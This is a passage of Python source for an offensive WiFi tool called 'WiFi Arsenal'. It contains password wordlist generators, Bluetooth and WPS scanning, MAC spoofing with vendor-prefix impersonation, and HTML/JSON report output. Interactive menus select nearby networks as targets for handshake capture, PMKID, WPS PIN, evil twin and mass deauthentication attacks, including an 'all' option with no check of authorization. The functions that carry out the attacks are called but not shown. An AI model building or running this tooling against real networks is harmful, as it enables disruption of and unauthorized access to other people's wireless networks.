        print(f"{Fore.YELLOW}[*] Generating smart wordlist: {output_file}{Style.RESET_ALL}")
        
        # Common password patterns and bases
        patterns = [
            # Years and dates
            lambda: str(random.randint(1990, 2030)),
            lambda: str(random.randint(1, 31)).zfill(2) + str(random.randint(1, 12)).zfill(2) + str(random.randint(1990, 2030)),
            
            # Common words with numbers
            lambda: random.choice(['password', 'admin', 'root', 'wifi', 'internet', 'router', 'home', 'office']) + str(random.randint(1, 999)),
            lambda: random.choice(['password', 'admin', 'root', 'wifi', 'internet', 'router', 'home', 'office']) + str(random.randint(2000, 2030)),
            
            # Phone number patterns
            lambda: ''.join([str(random.randint(0, 9)) for _ in range(10)]),
            
            # Common sequences
            lambda: '12345678',
            lambda: '87654321',
            lambda: 'qwertyui',
            lambda: 'asdfghjk',
            
            # Names with numbers
            lambda: random.choice(['john', 'mary', 'mike', 'sarah', 'david', 'lisa']) + str(random.randint(1, 999)),
            
            # Router defaults
            lambda: random.choice(['admin', 'password', '12345678', 'password123', 'admin123']),
            
            # Mixed case variants
            lambda: random.choice(['Password', 'Admin', 'WiFi', 'Internet']) + str(random.randint(1, 999)),
        ]
        
        passwords = set()
        
        # Add common passwords
        common_passwords = [
            'password', 'password123', '12345678', 'admin', 'root', 'qwerty',
            'letmein', 'welcome', 'monkey', 'dragon', 'master', 'internet',
            'wifi', 'router', 'home', 'office', 'guest', 'public'
        ]
        passwords.update(common_passwords)
        
        # Generate pattern-based passwords
        while len(passwords) < count:
            pattern = random.choice(patterns)
            try:
                password = pattern()
                if 6 <= len(password) <= 20:
                    passwords.add(password)
            except:
                continue
                
        with open(output_file, 'w') as f:
            for password in passwords:
                f.write(password + '\n')
                
        print(f"{Fore.GREEN}[+] Generated {len(passwords)} smart passwords{Style.RESET_ALL}")
        
    def bluetooth_scan_advanced(self):
        """Advanced Bluetooth scanning"""
        print(f"{Fore.YELLOW}[*] Advanced Bluetooth scanning...{Style.RESET_ALL}")
        self.log_action("Bluetooth Scan", "Advanced scan started")
        
        devices = []
        
        # Method 1: hcitool scan
        try:
            result = subprocess.run(['hcitool', 'scan'], 
                                   capture_output=True, text=True, timeout=30)
            
            for line in result.stdout.split('\n')[1:]:
                if line.strip():
                    parts = line.strip().split('\t')
                    if len(parts) >= 2:
                        devices.append({
                            'mac': parts[0],
                            'name': parts[1] if len(parts) > 1 else 'Unknown',
                            'type': 'Classic'
                        })
        except:
            pass
            
        # Method 2: bluetoothctl scan (BLE)
        try:
            # Start BLE scan
            subprocess.run(['bluetoothctl', 'scan', 'on'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(10)
            
            result = subprocess.run(['bluetoothctl', 'devices'], 
                                   capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'Device' in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        mac = parts[1]
                        name = ' '.join(parts[2:])
                        if not any(d['mac'] == mac for d in devices):
                            devices.append({
                                'mac': mac,
                                'name': name,
                                'type': 'BLE'
                            })
                            
            subprocess.run(['bluetoothctl', 'scan', 'off'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
            
        if devices:
            print(f"{Fore.GREEN}[+] Found {len(devices)} Bluetooth devices{Style.RESET_ALL}")
            print(f"\n{'#':<3} {'Name':<20} {'MAC Address':<18} {'Type':<10}")
            print("-" * 55)
            for i, device in enumerate(devices):
                print(f"{i+1:<3} {device['name']:<20} {device['mac']:<18} {device['type']:<10}")
        else:
            print(f"{Fore.RED}[-] No Bluetooth devices found{Style.RESET_ALL}")
            
        return devices
        
    def generate_report(self, scan_results, attacks_performed):
        """Generate comprehensive penetration test report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"{self.results_dir}/reports/wifi_arsenal_report_{timestamp}.json"
        
        report_data = {
            'tool': 'WiFi Arsenal',
            'version': self.version,
            'author': self.author,
            'timestamp': timestamp,
            'scan_summary': {
                'total_networks': len(scan_results),
                'open_networks': len([n for n in scan_results if n.get('privacy', '').upper() == '']),
                'wep_networks': len([n for n in scan_results if 'WEP' in n.get('privacy', '').upper()]),
                'wpa_networks': len([n for n in scan_results if 'WPA' in n.get('privacy', '').upper()]),
                'wps_networks': len([n for n in scan_results if 'WPS' in n.get('privacy', '').upper()])
            },
            'networks': scan_results,
            'attacks_performed': attacks_performed,
            'vulnerabilities_found': [],
            'recommendations': []
        }
        
        # Analyze vulnerabilities
        for network in scan_results:
            vuln_analysis = network.get('security_analysis', {})
            if vuln_analysis.get('strength') in ['None', 'Very Weak', 'Weak']:
                report_data['vulnerabilities_found'].append({
                    'network': network['essid'],
                    'bssid': network['bssid'],
                    'vulnerability': vuln_analysis.get('vulnerabilities', []),
                    'severity': vuln_analysis.get('strength')
                })
                
        # Generate recommendations
        if report_data['scan_summary']['open_networks'] > 0:
            report_data['recommendations'].append("Secure open networks with WPA3 encryption")
        if report_data['scan_summary']['wep_networks'] > 0:
            report_data['recommendations'].append("Upgrade WEP networks to WPA2/WPA3")
        if report_data['scan_summary']['wps_networks'] > 0:
            report_data['recommendations'].append("Disable WPS on routers")
            
        # Save report
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2, default=str)
            
        # Generate HTML report
        html_report = self.generate_html_report(report_data)
        html_file = f"{self.results_dir}/reports/wifi_arsenal_report_{timestamp}.html"
        with open(html_file, 'w') as f:
            f.write(html_report)
            
        print(f"{Fore.GREEN}[+] Reports saved to:")
        print(f"    JSON: {report_file}")
        print(f"    HTML: {html_file}{Style.RESET_ALL}")
        
    def generate_html_report(self, report_data):
        """Generate HTML report"""
        html_template = f"""<!DOCTYPE html>
<html>
<head>
    <title>WiFi Arsenal Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .header {{ background: #007cba; color: white; padding: 20px; text-align: center; }}
        .summary {{ background: #f0f0f0; padding: 15px; margin: 20px 0; }}
        .network {{ border: 1px solid #ddd; margin: 10px 0; padding: 15px; }}
        .vulnerable {{ border-left: 5px solid #ff0000; }}
        .secure {{ border-left: 5px solid #00ff00; }}
        .warning {{ border-left: 5px solid #ffaa00; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>WiFi Arsenal Penetration Test Report</h1>
        <p>Generated on {report_data['timestamp']} by {report_data['author']}</p>
    </div>
    
    <div class="summary">
        <h2>Executive Summary</h2>
        <p>Total Networks Discovered: {report_data['scan_summary']['total_networks']}</p>
        <p>Open Networks: {report_data['scan_summary']['open_networks']}</p>
        <p>WEP Networks: {report_data['scan_summary']['wep_networks']}</p>
        <p>WPA Networks: {report_data['scan_summary']['wpa_networks']}</p>
        <p>WPS Enabled: {report_data['scan_summary']['wps_networks']}</p>
    </div>
    
    <h2>Discovered Networks</h2>
    <table>
        <tr>
            <th>ESSID</th>
            <th>BSSID</th>
            <th>Channel</th>
            <th>Security</th>
            <th>Signal</th>
            <th>Risk Level</th>
        </tr>"""
        
        for network in report_data['networks']:
            security_analysis = network.get('security_analysis', {})
            strength = security_analysis.get('strength', 'Unknown')
            
            risk_class = 'secure'
            if strength in ['None', 'Very Weak']:
                risk_class = 'vulnerable'
            elif strength == 'Weak':
                risk_class = 'warning'
                
            html_template += f"""
        <tr class="{risk_class}">
            <td>{network.get('essid', 'Hidden')}</td>
            <td>{network.get('bssid', 'Unknown')}</td>
            <td>{network.get('channel', 'Unknown')}</td>
            <td>{network.get('privacy', 'Unknown')}</td>
            <td>{network.get('power', 'Unknown')} dBm</td>
            <td>{strength}</td>
        </tr>"""
        
        html_template += """
    </table>
    
    <h2>Recommendations</h2>
    <ul>"""
        
        for rec in report_data['recommendations']:
            html_template += f"        <li>{rec}</li>\n"
            
        html_template += """
    </ul>
</body>
</html>"""
        
        return html_template
        
    def main_menu(self):
        """Enhanced main menu interface"""
        attacks_performed = []
        scan_results = []
        
        while True:
            print(f"\n{Fore.CYAN}" + "="*70)
            print("                    WiFi Arsenal - Main Menu")
            print("="*70 + Style.RESET_ALL)
            print(f"{Fore.GREEN}Network Operations:{Style.RESET_ALL}")
            print("1.  Network Interface Setup")
            print("2.  Advanced WiFi Discovery")
            print("3.  WPA/WPA2 Handshake Capture")
            print("4.  PMKID Attack")
            print(f"\n{Fore.YELLOW}Attack Operations:{Style.RESET_ALL}")
            print("5.  Advanced Password Cracking")
            print("6.  WPS Attack Suite")
            print("7.  Enhanced Evil Twin")
            print("8.  Mass Deauth Attack")
            print(f"\n{Fore.MAGENTA}Utilities:{Style.RESET_ALL}")
            print("9.  MAC Address Spoofing")
            print("10. Advanced Bluetooth Scan")
            print("11. Smart Wordlist Generation")
            print(f"\n{Fore.BLUE}Reporting:{Style.RESET_ALL}")
            print("12. Generate Report")
            print("13. View Results")
            print("14. System Information")
            print(f"\n{Fore.RED}0.  Exit{Style.RESET_ALL}")
            print("="*70)
            
            try:
                choice = input(f"\n{Fore.CYAN}[?] Select option: {Style.RESET_ALL}").strip()
                
                if choice == '1':
                    self.interface_setup()
                elif choice == '2':
                    scan_results = self.advanced_network_discovery()
                elif choice == '3':
                    self.handshake_capture_menu()
                    attacks_performed.append("Handshake Capture")
                elif choice == '4':
                    self.pmkid_attack_menu()
                    attacks_performed.append("PMKID Attack")
                elif choice == '5':
                    self.advanced_password_cracking_menu()
                    attacks_performed.append("Password Cracking")
                elif choice == '6':
                    self.advanced_wps_attack_menu()
                    attacks_performed.append("WPS Attack")
                elif choice == '7':
                    self.enhanced_evil_twin_menu()
                    attacks_performed.append("Evil Twin Attack")
                elif choice == '8':
                    self.mass_deauth_menu()
                    attacks_performed.append("Mass Deauth Attack")
                elif choice == '9':
                    self.mac_spoofing_menu()
                elif choice == '10':
                    self.bluetooth_scan_advanced()
                elif choice == '11':
                    self.smart_wordlist_menu()
                elif choice == '12':
                    if scan_results:
                        self.generate_report(scan_results, attacks_performed)
                    else:
                        print(f"{Fore.RED}[!] No scan results available for report generation{Style.RESET_ALL}")
                elif choice == '13':
                    self.view_results()
                elif choice == '14':
                    self.system_info()
                elif choice == '0':
                    self.cleanup_and_exit()
                else:
                    print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
                    
            except KeyboardInterrupt:
                self.cleanup_and_exit()
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
                
    def interface_setup(self):
        """Enhanced interface setup"""
        interfaces = self.get_interfaces()
        
        if not interfaces:
            print(f"{Fore.RED}[!] No wireless interfaces found{Style.RESET_ALL}")
            print(f"[*] Make sure you have a wireless adapter connected")
            return
            
        print(f"\n{Fore.CYAN}[*] Available wireless interfaces:{Style.RESET_ALL}")
        for i, iface in enumerate(interfaces):
            print(f"  {i+1}. {iface}")
            
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select interface: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(interfaces):
                self.interface = interfaces[choice]
                if self.setup_monitor_mode(self.interface):
                    print(f"{Fore.GREEN}[+] Interface {self.interface} configured successfully{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[!] Failed to setup monitor mode on {self.interface}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
            
    def advanced_network_discovery(self):
        """Advanced network discovery menu"""
        if not self.monitor_interface:
            print(f"{Fore.RED}[!] Please setup interface first{Style.RESET_ALL}")
            return []
            
        duration = input(f"\n{Fore.CYAN}[?] Scan duration (default 60s): {Style.RESET_ALL}").strip()
        try:
            duration = int(duration) if duration else 60
        except ValueError:
            duration = 60
            
        channel_hop = input(f"{Fore.CYAN}[?] Enable channel hopping? (Y/n): {Style.RESET_ALL}").strip().lower()
        channel_hop = channel_hop != 'n'
            
        networks = self.advanced_scan_networks(duration, channel_hop)
        if networks:
            self.target_networks = networks
            self.display_networks(networks)
            return networks
        else:
            print(f"{Fore.RED}[-] No networks found{Style.RESET_ALL}")
            return []
            
    def handshake_capture_menu(self):
        """Enhanced handshake capture menu"""
        if not self.target_networks:
            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
            return
            
        self.display_networks(self.target_networks)
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select target network: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(self.target_networks):
                target = self.target_networks[choice]
                cap_file = self.capture_handshake(
                    target['bssid'], 
                    target['channel'], 
                    target['essid']
                )
                if cap_file:
                    self.captured_handshakes.append(cap_file)
                    print(f"{Fore.GREEN}[+] Handshake saved to {cap_file}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
            
    def pmkid_attack_menu(self):
        """PMKID attack menu"""
        if not self.target_networks:
            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
            return
            
        # Filter WPA2 networks
        wpa2_networks = [n for n in self.target_networks if 'WPA2' in n.get('privacy', '').upper()]
        
        if not wpa2_networks:
            print(f"{Fore.RED}[!] No WPA2 networks found for PMKID attack{Style.RESET_ALL}")
            return
            
        print(f"\n{Fore.CYAN}[*] WPA2 Networks suitable for PMKID attack:{Style.RESET_ALL}")
        for i, network in enumerate(wpa2_networks):
            essid = network['essid'] if network['essid'] else '<Hidden>'
            print(f"  {i+1}. {essid} ({network['bssid']})")
            
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select target network: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(wpa2_networks):
                target = wpa2_networks[choice]
                cap_file = self.pmkid_attack(
                    target['bssid'],
                    target['channel'],
                    target['essid']
                )
                if cap_file:
                    print(f"{Fore.GREEN}[+] PMKID capture saved to {cap_file}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
            
    def advanced_password_cracking_menu(self):
        """Advanced password cracking menu"""
        if not self.captured_handshakes:
            print(f"{Fore.RED}[!] No captured handshakes available{Style.RESET_ALL}")
            return
            
        print(f"\n{Fore.CYAN}[*] Available handshakes:{Style.RESET_ALL}")
        for i, cap_file in enumerate(self.captured_handshakes):
            print(f"  {i+1}. {cap_file}")
            
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select handshake: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(self.captured_handshakes):
                cap_file = self.captured_handshakes[choice]
                
                print(f"\n{Fore.CYAN}[*] Wordlist options:{Style.RESET_ALL}")
                print("1. Use existing wordlist")
                print("2. Generate smart wordlist")
                print("3. Use both")
                
                wordlist_choice = input(f"{Fore.CYAN}[?] Select option: {Style.RESET_ALL}").strip()
                
                if wordlist_choice == '1':
                    wordlist = input(f"{Fore.CYAN}[?] Wordlist file path: {Style.RESET_ALL}").strip()
                    if os.path.exists(wordlist):
                        password = self.advanced_crack_handshake(cap_file, wordlist)
                    else:
                        print(f"{Fore.RED}[!] Wordlist file not found{Style.RESET_ALL}")
                elif wordlist_choice == '2':
                    wordlist = f"{self.results_dir}/wordlists/smart_wordlist.txt"
                    self.generate_smart_wordlist(wordlist, 10000)
                    password = self.advanced_crack_handshake(cap_file, wordlist)
                elif wordlist_choice == '3':
                    # Try existing wordlist first
                    wordlist = input(f"{Fore.CYAN}[?] Wordlist file path: {Style.RESET_ALL}").strip()
                    password = None
                    if os.path.exists(wordlist):
                        password = self.advanced_crack_handshake(cap_file, wordlist)
                    
                    # If not found, try smart wordlist
                    if not password:
                        smart_wordlist = f"{self.results_dir}/wordlists/smart_wordlist.txt"
                        self.generate_smart_wordlist(smart_wordlist, 10000)
                        password = self.advanced_crack_handshake(cap_file, smart_wordlist)
                else:
                    print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
                    
            else:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
            
    def advanced_wps_attack_menu(self):
        """Advanced WPS attack menu"""
        if not self.monitor_interface:
            print(f"{Fore.RED}[!] Please setup interface first{Style.RESET_ALL}")
            return
            
        wps_networks = self.wps_scan()
        if not wps_networks:
            return
            
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select target network: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(wps_networks):
                target = wps_networks[choice]
                pin, password = self.advanced_wps_attack(
                    target['bssid'], 
                    target['channel'],
                    target['essid']
                )
                if password:
                    print(f"{Fore.GREEN}[+] WPS attack successful!")
                    print(f"[+] PIN: {pin}")
                    print(f"[+] Password: {password}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[-] WPS attack failed{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
            
    def enhanced_evil_twin_menu(self):
        """Enhanced evil twin menu"""
        if not self.target_networks:
            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
            return
            
        self.display_networks(self.target_networks)
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select target network: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(self.target_networks):
                target = self.target_networks[choice]
                self.enhanced_evil_twin(
                    target['essid'], 
                    target['bssid'], 
                    target['channel']
                )
            else:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
            
    def mass_deauth_menu(self):
        """Mass deauth attack menu"""
        if not self.target_networks:
            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
            return
            
        print(f"\n{Fore.CYAN}[*] Available networks:{Style.RESET_ALL}")
        self.display_networks(self.target_networks)
        
        target_input = input(f"\n{Fore.CYAN}[?] Select targets (comma-separated, or 'all'): {Style.RESET_ALL}").strip()
        
        if target_input.lower() == 'all':
            targets = self.target_networks
        else:
            try:
                indices = [int(x.strip()) - 1 for x in target_input.split(',')]
                targets = [self.target_networks[i] for i in indices if 0 <= i < len(self.target_networks)]
            except:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
                return
                
        if not targets:
            print(f"{Fore.RED}[!] No valid targets selected{Style.RESET_ALL}")
            return
            
        duration = input(f"{Fore.CYAN}[?] Attack duration (default 60s): {Style.RESET_ALL}").strip()
        try:
            duration = int(duration) if duration else 60
        except ValueError:
            duration = 60
            
        print(f"{Fore.RED}[!] WARNING: This will perform deauth attacks on {len(targets)} networks")
        confirm = input(f"[?] Continue? (y/N): {Style.RESET_ALL}").strip().lower()
        
        if confirm == 'y':
            self.mass_deauth_attack(targets, duration)
        else:
            print(f"{Fore.YELLOW}[*] Attack cancelled{Style.RESET_ALL}")
            
    def mac_spoofing_menu(self):
        """Enhanced MAC spoofing menu"""
        interfaces = self.get_interfaces()
        
        if not interfaces:
            print(f"{Fore.RED}[!] No wireless interfaces found{Style.RESET_ALL}")
            return
            
        print(f"\n{Fore.CYAN}[*] Available interfaces:{Style.RESET_ALL}")
        for i, iface in enumerate(interfaces):
            print(f"  {i+1}. {iface}")
            
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select interface: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(interfaces):
                interface = interfaces[choice]
                
                print(f"\n{Fore.CYAN}[*] MAC spoofing options:{Style.RESET_ALL}")
                print("1. Random MAC")
                print("2. Specific MAC")
                print("3. Vendor-specific MAC")
                
                mac_choice = input(f"{Fore.CYAN}[?] Select option: {Style.RESET_ALL}").strip()
                
                if mac_choice == '1':
                    self.mac_change(interface)
                elif mac_choice == '2':
                    mac = input(f"{Fore.CYAN}[?] Enter MAC address (XX:XX:XX:XX:XX:XX): {Style.RESET_ALL}").strip()
                    if self.validate_mac(mac):
                        self.mac_change_specific(interface, mac)
                    else:
                        print(f"{Fore.RED}[!] Invalid MAC address format{Style.RESET_ALL}")
                elif mac_choice == '3':
                    self.vendor_mac_change(interface)
                else:
                    print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
            
    def validate_mac(self, mac):
        """Validate MAC address format"""
        return re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac) is not None
        
    def mac_change_specific(self, interface, mac):
        """Change MAC to specific address"""
        print(f"{Fore.YELLOW}[*] Changing MAC address of {interface} to {mac}{Style.RESET_ALL}")
        
        subprocess.run(['ifconfig', interface, 'down'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['macchanger', '-m', mac, interface],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['ifconfig', interface, 'up'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print(f"{Fore.GREEN}[+] MAC address changed to {mac}{Style.RESET_ALL}")
        
    def vendor_mac_change(self, interface):
        """Change MAC to vendor-specific address"""
        vendors = {
            'Apple': ['00:1b:63', '00:23:df', '00:26:4a'],
            'Samsung': ['00:07:ab', '00:15:99', '00:16:32'],
            'Intel': ['00:02:b3', '00:13:ce', '00:15:00'],
            'TP-Link': ['00:27:19', '14:cc:20', '50:c7:bf'],
            'Netgear': ['00:09:5b', '00:0f:b5', '20:4e:7f']
        }
        
        print(f"\n{Fore.CYAN}[*] Available vendors:{Style.RESET_ALL}")
        vendor_list = list(vendors.keys())
        for i, vendor in enumerate(vendor_list):
            print(f"  {i+1}. {vendor}")
            
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select vendor: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(vendor_list):
                vendor = vendor_list[choice]
                oui = random.choice(vendors[vendor])
                
                # Generate random last 3 octets
                last_octets = ':'.join(['%02x' % random.randint(0, 255) for _ in range(3)])
                mac = f"{oui}:{last_octets}"
                
                self.mac_change_specific(interface, mac)
                print(f"{Fore.GREEN}[+] Changed to {vendor} MAC address{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
            
    def smart_wordlist_menu(self):
        """Smart wordlist generation menu"""
        output_file = input(f"\n{Fore.CYAN}[?] Output file path (default: auto): {Style.RESET_ALL}").strip()
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"{self.results_dir}/wordlists/smart_wordlist_{timestamp}.txt"
            
        try:
            count = int(input(f"{Fore.CYAN}[?] Number of passwords (default 10000): {Style.RESET_ALL}") or "10000")
            
            print(f"\n{Fore.CYAN}[*] Wordlist types:{Style.RESET_ALL}")
            print("1. Smart patterns (recommended)")
            print("2. Bruteforce patterns")
            print("3. Common passwords")
            print("4. Mixed (all types)")
            
            wl_type = input(f"{Fore.CYAN}[?] Select type: {Style.RESET_ALL}").strip()
            
            if wl_type == '1':
                self.generate_smart_wordlist(output_file, count)
            elif wl_type == '2':
                self.generate_bruteforce_wordlist(output_file, count)
            elif wl_type == '3':
                self.generate_common_wordlist(output_file, count)
            elif wl_type == '4':
                self.generate_mixed_wordlist(output_file, count)
            else:
                print(f"{Fore.RED}[!] Invalid selection, using smart patterns{Style.RESET_ALL}")
                self.generate_smart_wordlist(output_file, count)
                
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
            
    def generate_bruteforce_wordlist(self, output_file, count=10000):
        """Generate bruteforce wordlist"""
        print(f"{Fore.YELLOW}[*] Generating bruteforce wordlist: {output_file}{Style.RESET_ALL}")
        
        import itertools
        chars = string.ascii_lowercase + string.digits
        passwords = set()
        
        # Generate passwords of varying lengths
        for length in range(4, 9):
            for combo in itertools.product(chars, repeat=length):
                if len(passwords) >= count:
                    break
                passwords.add(''.join(combo))
            if len(passwords) >= count:
                break
                
        with open(output_file, 'w') as f:
            for password in list(passwords)[:count]:
                f.write(password + '\n')
                
        print(f"{Fore.GREEN}[+] Generated {len(passwords)} bruteforce passwords{Style.RESET_ALL}")
        
    def generate_common_wordlist(self, output_file, count=10000):
        """Generate common passwords wordlist"""
        print(f"{Fore.YELLOW}[*] Generating common passwords wordlist: {output_file}{Style.RESET_ALL}")
        
        # Extended common passwords list
        common_passwords = [
            'password', 'password123', '12345678', '123456789', '1234567890',
            'admin', 'administrator', 'root', 'user', 'guest', 'qwerty',
            'letmein', 'welcome', 'monkey', 'dragon', 'master', 'internet',
            'wifi', 'router', 'home', 'office', 'public', 'default', 'login',
            'pass', 'secret', 'system', 'test', 'demo', 'sample', 'temp',
            'changeme', 'newpass', 'oldpass', 'password1', 'password12',
            'admin123', 'root123', 'user123', 'guest123', 'test123',
            'welcome123', 'login123', 'pass123', 'secret123', 'system123'
        ]
        
        # Add variations
        passwords = set(common_passwords)
        
        # Add number variations
        for base in common_passwords[:20]:  # Limit to avoid explosion
            for i in range(100):
                passwords.add(f"{base}{i}")
                passwords.add(f"{base}{i:02d}")
                passwords.add(f"{base}{i:03d}")
                
        # Add year variations
        for base in common_passwords[:20]:
            for year in range(1990, 2031):
                passwords.add(f"{base}{year}")
                
        # Add capitalization variations
        for base in common_passwords[:20]:
            passwords.add(base.capitalize())
            passwords.add(base.upper())
            
        passwords_list = list(passwords)[:count]
        
        with open(output_file, 'w') as f:
            for password in passwords_list:
                f.write(password + '\n')
                
        print(f"{Fore.GREEN}[+] Generated {len(passwords_list)} common passwords{Style.RESET_ALL}")
        
    def generate_mixed_wordlist(self, output_file, count=10000):
        """Generate mixed wordlist with all types"""
        print(f"{Fore.YELLOW}[*] Generating mixed wordlist: {output_file}{Style.RESET_ALL}")
        
        # Generate each type with 1/3 of the count
        third = count // 3
        
        temp_files = []
        
        # Smart patterns
        smart_file = f"{output_file}.smart"
        self.generate_smart_wordlist(smart_file, third)
        temp_files.append(smart_file)
        
        # Common passwords
        common_file = f"{output_file}.common"
        self.generate_common_wordlist(common_file, third)
        temp_files.append(common_file)
        
        # Bruteforce patterns
        brute_file = f"{output_file}.brute"
        self.generate_bruteforce_wordlist(brute_file, count - 2*third)
        temp_files.append(brute_file)
        
        # Combine all files
        all_passwords = set()
        for temp_file in temp_files:
            try:
                with open(temp_file, 'r') as f:
                    all_passwords.update(line.strip() for line in f)
                os.remove(temp_file)
            except:
                pass
                
        # Write final wordlist
        with open(output_file, 'w') as f:
            for password in list(all_passwords)[:count]:
                f.write(password + '\n')
                
        print(f"{Fore.GREEN}[+] Generated {len(all_passwords)} mixed passwords{Style.RESET_ALL}")
        
    def wps_scan(self):
        """Enhanced WPS scan"""
        if not self.monitor_interface:
            print(f"{Fore.RED}[!] Monitor mode not enabled{Style.RESET_ALL}")
            return []
            
        print(f"{Fore.YELLOW}[*] Scanning for WPS enabled networks...{Style.RESET_ALL}")
        
        try:
            result = subprocess.run(['wash', '-i', self.monitor_interface, '-C'],
                                   capture_output=True, text=True, timeout=45)
            
            wps_networks = []
            lines = result.stdout.split('\n')
            
            for line in lines[2:]:  # Skip header
                if line.strip() and len(line.split()) >= 6:
                    parts = line.split()
                    try:
                        network = {
                            'bssid': parts[0],
                            'channel': parts[1],
                            'rssi': parts[2],
                            'wps_version': parts[3],
                            'wps_locked': parts[4],
                            'essid': ' '.join(parts[5:]) if len(parts) > 5 else 'Hidden'
                        }
                        wps_networks.append(network)
                    except:
                        continue
                        
            if wps_networks:
                print(f"{Fore.GREEN}[+] Found {len(wps_networks)} WPS enabled networks{Style.RESET_ALL}")
                self.display_wps_networks(wps_networks)
            else:
                print(f"{Fore.RED}[-] No WPS enabled networks found{Style.RESET_ALL}")
                
        except subprocess.TimeoutExpired:
            print(f"{Fore.YELLOW}[*] WPS scan timed out{Style.RESET_ALL}")
            wps_networks = []
        except Exception as e:
            print(f"{Fore.RED}[!] WPS scan failed: {e}{Style.RESET_ALL}")
            wps_networks = []
            
        return wps_networks
        
    def display_wps_networks(self, networks):
        """Enhanced WPS network display"""
        print(f"\n{Fore.CYAN}[*] WPS Enabled Networks:{Style.RESET_ALL}")
        print("-" * 85)
        print(f"{'#':<3} {'ESSID':<20} {'BSSID':<18} {'Ch':<3} {'RSSI':<5} {'Ver':<4} {'Locked':<8}")
        print("-" * 85)
        
        for i, network in enumerate(networks):
            essid = network['essid'] if network['essid'] and network['essid'] != ' ' else f"{Fore.YELLOW}<Hidden>{Style.RESET_ALL}"
            locked_color = Fore.RED if network['wps_locked'].upper() == 'YES' else Fore.GREEN
            
            print(f"{i+1:<3} {essid:<20} {network['bssid']:<18} "
                  f"{network['channel']:<3} {network['rssi']:<5} "
                  f"{network['wps_version']:<4} {locked_color}{network['wps_locked']:<8}{Style.RESET_ALL}")
                  
    def view_results(self):
        """Enhanced results viewer"""
        print(f"\n{Fore.CYAN}[*] WiFi Arsenal Results{Style.RESET_ALL}")
        print(f"Results directory: {self.results_dir}")
        
        # Check each subdirectory
        subdirs = ['handshakes', 'wordlists', 'logs', 'reports', 'evil_twin']
        
        for subdir in subdirs:
            full_path = os.path.join(self.results_dir, subdir)
            if os.path.exists(full_path):
                files = os.listdir(full_path)
                if files:
                    print(f"\n{Fore.GREEN}[*] {subdir.title()} ({len(files)} files):{Style.RESET_ALL}")
                    for f in sorted(files)[-10:]:  # Show last 10 files
                        file_path = os.path.join(full_path, f)
                        size = os.path.getsize(file_path)
